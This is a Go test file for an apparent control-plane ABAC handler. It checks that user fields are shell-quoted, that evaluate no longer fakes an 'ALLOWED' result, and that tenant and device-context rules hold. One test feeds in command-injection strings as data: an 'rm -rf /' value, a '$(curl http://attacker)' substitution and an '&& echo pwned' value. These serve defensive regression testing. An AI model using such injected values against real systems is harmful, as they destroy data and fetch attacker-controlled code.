package controlplane

// abac_ops_security_test.go — A1 审计 BA-04 的变异反证。
//
// 旧实现把用户字段原样拼进 `echo '{"subject":%s,...}'`：请求体带 ' 即闭合单引号注入命令；
// evaluate 则把 "Result: ALLOWED" 硬编码进 echo——不查任何引擎、任何输入都"允许"。
// 本文件钉住两件事：
//  1. policy-create 的脚本是「JSON 编码 → shell 单引号字面量」的精确形状（全等断言），
//     且该字面量经真 shell 求值后逐字节还原为 JSON 文档（注入层不存在）；
//  2. buildABACScript 的 evaluate 一律 501（设备脚本路径永不产出假判定），缺字段 400、未知 action 400；
//     HTTP evaluate 路径由服务端引擎决策（带 deviceID 时注入设备上下文，见下文 device-context 用例）。
//
// 真 shell 对拍的形状沿用 pkg/shellquote/quote_test.go 的先例（argv 数组 + 探针，
// Windows 上找 git-bash/WSL，找不到才跳过），注入语义必须交给 sh -c 验。
import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"strings"
	"testing"

	"github.com/Levango7/OpsMesh/internal/proto"
)

// abacShellProbe 本机可用的 POSIX shell 启动命令（nil=无）。
var abacShellProbe = func() []string {
	if _, err := exec.LookPath("sh"); err == nil {
		return []string{"sh", "-c"}
	}
	for _, cand := range []string{
		`C:\Program Files\Git\bin\bash.exe`,
		`C:\Program Files\Git\usr\bin\bash.exe`,
		`C:\Program Files (x86)\Git\bin\bash.exe`,
	} {
		if _, err := os.Stat(cand); err == nil {
			return []string{cand, "-c"}
		}
	}
	if _, err := exec.LookPath("wsl"); err == nil {
		return []string{"wsl", "sh", "-c"}
	}
	return nil
}()

// abacShellEval 让真实 shell 求值给定脚本体（argv 数组传参，不走 shell 拼接执行路径）。
func abacShellEval(t *testing.T, script string) string {
	t.Helper()
	if abacShellProbe == nil {
		t.Skip("no POSIX shell available on this host")
	}
	out, err := exec.Command(abacShellProbe[0], append(abacShellProbe[1:], script)...).CombinedOutput()
	if err != nil {
		t.Fatalf("shell 求值失败: %v (%s)", err, out)
	}
	return string(out)
}

func TestBuildABACScript_PolicyCreateQuotesPayload(t *testing.T) {
	// 三层载荷：单引号闭合、双引号+命令替换、反引号——旧实现任一都能逃逸
	subject := `x'; rm -rf / #`
	resource := `r"; $(curl http://attacker) `
	actionAttr := "delete-all"
	context := "ctx' && echo pwned"

	script, status, errMsg := buildABACScript("policy-create", subject, resource, actionAttr, context)
	if errMsg != "" || status != 0 {
		t.Fatalf("policy-create 应可下发，得到 status=%d err=%q", status, errMsg)
	}

	doc, err := json.Marshal(map[string]string{
		"subject": subject, "resource": resource, "action": actionAttr, "context": context,
	})
	if err != nil {
		t.Fatalf("json.Marshal: %v", err)
	}
	want := `mkdir -p /etc/opsmesh/abac && echo ` + shellQuote(string(doc)) +
		` >> /etc/opsmesh/abac/policies.json && echo "ABAC policy created"`
	if script != want {
		t.Fatalf("脚本形状不是「JSON→shell 字面量」的精确形状：\n got: %s\nwant: %s", script, want)
	}
	// 真 shell 求值：echo 参数逐字节还原为 JSON 文档——"注入层不存在"的直接证据
	evaluated := abacShellEval(t, "printf '%s' "+shellQuote(string(doc)))
	if evaluated != string(doc) {
		t.Fatalf("shell 求值后不等于原文档：\n got: %q\nwant: %q", evaluated, doc)
	}
}

func TestBuildABACScript_EvaluateIsExplicit501(t *testing.T) {
	script, status, errMsg := buildABACScript("evaluate", "s", "r", "a", "")
	if status != 501 {
		t.Fatalf("evaluate 应显式 501（不再假 ALLOWED），得到 status=%d script=%q", status, script)
	}
	if script != "" {
		t.Fatalf("evaluate 不得再产出任何下发脚本，得到 %q", script)
	}
	if !strings.Contains(errMsg, "intentionally disabled") {
		t.Fatalf("501 消息应说明设备脚本路径被有意禁用，得到 %q", errMsg)
	}
	if !strings.Contains(errMsg, "device-context enrichment") {
		t.Fatalf("501 消息应指向 HTTP 服务端路径的设备上下文增强，得到 %q", errMsg)
	}
}

func TestBuildABACScript_Rejections(t *testing.T) {
	if _, status, errMsg := buildABACScript("policy-create", "", "r", "a", ""); status != 400 {
		t.Fatalf("缺 subject 应 400，得到 %d %q", status, errMsg)
	}
	if _, status, errMsg := buildABACScript("no-such-action", "", "", "", ""); status != 400 {
		t.Fatalf("未知 action 应 400，得到 %d %q", status, errMsg)
	}
	if _, status, _ := buildABACScript("policy-list", "", "", "", ""); status != 0 {
		t.Fatalf("policy-list 无需字段，应可下发")
	}
}

// --- 设备上下文增强（2026-11-17）：HTTP evaluate 带 deviceID 时注入设备属性 ---

// abacTestServerWithDevice 构造测试控制面并登记一台指定租户的设备。
func abacTestServerWithDevice(t *testing.T, tenantID string) (*Server, *proto.DeviceInfo) {
	t.Helper()
	s := newTestServer()
	dev := &proto.DeviceInfo{
		DeviceID:  "dev-1",
		TenantID:  tenantID,
		Segment:   "seg-a",
		Hostname:  "host-a",
		OS:        "linux",
		Arch:      "amd64",
		State:     "online",
		TaskState: "idle",
		AgentID:   "agent-1",
		Managed:   true,
	}
	s.store.UpsertDevice(dev)
	return s, dev
}

// abacPostEvaluate 以指定租户身份调用 handleABAC（租户经 X-Tenant-ID 头注入，
// 与生产链路一致；demo 模式下要求链只校验头、requireProd 放行）。
func abacPostEvaluate(t *testing.T, s *Server, tenantID, body string) *httptest.ResponseRecorder {
	t.Helper()
	req := httptest.NewRequest(http.MethodPost, "/api/v1/abac", strings.NewReader(body))
	if tenantID != "" {
		req.Header.Set("X-Tenant-ID", tenantID)
	}
	w := httptest.NewRecorder()
	s.handleABAC(w, req)
	return w
}

// abacDecodeBody 解码响应体为通用 map（用于断言键存在性/契约形状）。
func abacDecodeBody(t *testing.T, w *httptest.ResponseRecorder) map[string]interface{} {
	t.Helper()
	var m map[string]interface{}
	if err := json.Unmarshal(w.Body.Bytes(), &m); err != nil {
		t.Fatalf("响应不是 JSON 对象: %v (body=%s)", err, w.Body.String())
	}
	return m
}

func TestHandleABAC_Evaluate_DeviceContextSameTenant(t *testing.T) {
	s, _ := abacTestServerWithDevice(t, "t1")
	// 条件同时引用设备属性（deviceID/segment）——只有注入设备上下文才可能命中。
	s.addABACPolicy(abacPolicy{
		ID: "p-dev", TenantID: "t1", Subject: "alice", Resource: "vm:*", Action: "read", Effect: "allow",
		Condition: map[string]string{"deviceID": "dev-1", "segment": "seg-a"},
	})
	body := `{"deviceID":"dev-1","action":"evaluate","subject":"alice","resource":"vm:42","actionAttr":"read"}`
	w := abacPostEvaluate(t, s, "t1", body)
	if w.Code != http.StatusOK {
		t.Fatalf("同租户带设备评估应 200，得到 %d body=%s", w.Code, w.Body.String())
	}
	resp := abacDecodeBody(t, w)
	if resp["evaluatedBy"] != "server+device-context" {
		t.Fatalf("evaluatedBy=%v, want server+device-context", resp["evaluatedBy"])
	}
	if resp["decision"] != "allow" || resp["allowed"] != true {
		t.Fatalf("应命中设备条件允许策略，得到 decision=%v allowed=%v reason=%v", resp["decision"], resp["allowed"], resp["reason"])
	}
	if resp["matchedPolicyID"] != "p-dev" {
		t.Fatalf("matchedPolicyID=%v, want p-dev", resp["matchedPolicyID"])
	}
	dc, ok := resp["deviceContext"].(map[string]interface{})
	if !ok {
		t.Fatalf("deviceContext 缺失或形状不对: %v", resp["deviceContext"])
	}
	if dc["hostname"] != "host-a" || dc["segment"] != "seg-a" || dc["deviceID"] != "dev-1" {
		t.Fatalf("deviceContext 注入子集不完整: %v", dc)
	}
	if dc["managed"] != true {
		t.Fatalf("deviceContext.managed=%v, want true", dc["managed"])
	}
}

func TestHandleABAC_Evaluate_DeviceContextCrossTenantForbidden(t *testing.T) {
	s, _ := abacTestServerWithDevice(t, "t2") // 设备属于 t2，调用方是 t1
	s.addABACPolicy(abacPolicy{ID: "p-any", TenantID: "", Subject: "*", Resource: "*", Action: "*", Effect: "allow"})
	body := `{"deviceID":"dev-1","action":"evaluate","subject":"alice","resource":"vm:42","actionAttr":"read"}`
	w := abacPostEvaluate(t, s, "t1", body)
	if w.Code != http.StatusForbidden {
		t.Fatalf("跨租户设备评估应 403，得到 %d body=%s", w.Code, w.Body.String())
	}
	resp := abacDecodeBody(t, w)
	if _, exists := resp["decision"]; exists {
		t.Fatalf("403 响应不得包含任何决策字段: %s", w.Body.String())
	}
	if _, exists := resp["deviceContext"]; exists {
		t.Fatalf("403 响应不得泄露设备上下文: %s", w.Body.String())
	}
}

func TestHandleABAC_Evaluate_DeviceContextUnknownDevice(t *testing.T) {
	s := newTestServer()
	body := `{"deviceID":"no-such-dev","action":"evaluate","subject":"alice","resource":"vm:42","actionAttr":"read"}`
	w := abacPostEvaluate(t, s, "t1", body)
	if w.Code != http.StatusNotFound {
		t.Fatalf("未知设备应 404，得到 %d body=%s", w.Code, w.Body.String())
	}
	resp := abacDecodeBody(t, w)
	if resp["error"] != "device not found" {
		t.Fatalf("404 错误文案=%v, want device not found", resp["error"])
	}
}

func TestHandleABAC_Evaluate_DeviceContextDoesNotOverrideCallerKeys(t *testing.T) {
	s, _ := abacTestServerWithDevice(t, "t1")
	// 条件要求 hostname=caller-host（设备真值是 host-a）：只有调用方键优先才能命中。
	s.addABACPolicy(abacPolicy{
		ID: "p-caller", TenantID: "t1", Subject: "alice", Resource: "vm:*", Action: "read", Effect: "allow",
		Condition: map[string]string{"deviceID": "dev-1", "hostname": "caller-host", "env": "staging"},
	})
	body := `{"deviceID":"dev-1","action":"evaluate","subject":"alice","resource":"vm:42","actionAttr":"read",` +
		`"context":"{\"env\":\"staging\",\"hostname\":\"caller-host\"}"}`
	w := abacPostEvaluate(t, s, "t1", body)
	if w.Code != http.StatusOK {
		t.Fatalf("应 200，得到 %d body=%s", w.Code, w.Body.String())
	}
	resp := abacDecodeBody(t, w)
	if resp["decision"] != "allow" {
		t.Fatalf("调用方 hostname 应被保留（不得被设备元数据覆盖），得到 decision=%v reason=%v", resp["decision"], resp["reason"])
	}
	dc, ok := resp["deviceContext"].(map[string]interface{})
	if !ok {
		t.Fatalf("deviceContext 缺失: %v", resp["deviceContext"])
	}
	if _, exists := dc["hostname"]; exists {
		t.Fatalf("hostname 被调用方占用，不应出现在注入子集: %v", dc)
	}
	if dc["deviceID"] != "dev-1" {
		t.Fatalf("未被占用的设备键仍应注入，得到 %v", dc)
	}
}

func TestHandleABAC_Evaluate_DeviceContextInvalidJSON(t *testing.T) {
	s, _ := abacTestServerWithDevice(t, "t1")
	body := `{"deviceID":"dev-1","action":"evaluate","subject":"alice","resource":"vm:42","actionAttr":"read",` +
		`"context":"{not-json"}`
	w := abacPostEvaluate(t, s, "t1", body)
	if w.Code != http.StatusBadRequest {
		t.Fatalf("非法 context JSON 应 400，得到 %d body=%s", w.Code, w.Body.String())
	}
}

func TestHandleABAC_Evaluate_NoDeviceEvaluatedByServer(t *testing.T) {
	s := newTestServer()
	s.addABACPolicy(abacPolicy{ID: "p-plain", TenantID: "t1", Subject: "alice", Resource: "vm:1", Action: "read", Effect: "allow"})
	body := `{"action":"evaluate","subject":"alice","resource":"vm:1","actionAttr":"read"}`
	w := abacPostEvaluate(t, s, "t1", body)
	if w.Code != http.StatusOK {
		t.Fatalf("无设备评估应 200，得到 %d body=%s", w.Code, w.Body.String())
	}
	resp := abacDecodeBody(t, w)
	if resp["evaluatedBy"] != "server" {
		t.Fatalf("无 deviceID 时 evaluatedBy=%v, want server", resp["evaluatedBy"])
	}
	if _, exists := resp["deviceContext"]; exists {
		t.Fatalf("无 deviceID 时不应返回 deviceContext: %s", w.Body.String())
	}
	if resp["decision"] != "allow" {
		t.Fatalf("应命中 p-plain，得到 decision=%v reason=%v", resp["decision"], resp["reason"])
	}
}
